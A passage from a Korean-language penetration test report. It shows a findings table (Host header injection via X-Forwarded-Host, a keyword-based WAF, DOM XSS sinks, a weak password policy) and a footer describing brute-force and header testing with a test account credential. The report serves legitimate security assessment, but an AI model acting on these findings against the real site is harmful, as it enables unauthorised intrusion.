| Host Header | 미테스트 | **MED-04 신규** | X-Forwarded-Host 수용 |
| WAF 메커니즘 | 추정 | **확인** | 키워드 기반 차단 (확장자 아님) |
| DOM XSS 싱크 | 미매핑 | **HIGH-02에 추가** | function.js/event.js .html() 싱크 5개+ |
| 비밀번호 정책 | 미테스트 | **CRIT-03에 추가** | 6자 최소, 복잡성 무 |
| 모바일 분석 | 미테스트 | **LOW-03 확장** | jQuery 이중 로드, 별도 JS 파일 |

---

*보고서 버전: v5 (공격적 심층 테스트 반영)*  
*테스트: 외부 블랙박스, 비인증 + 인증(testtest123) + 공격적 150회 브루트포스/타이밍/헤더/메서드/DOM*  
*총 테스트 항목: 97+ 개별 테스트 케이스*  
*다음 단계: 소스코드 업로드 후 화이트박스 테스트*
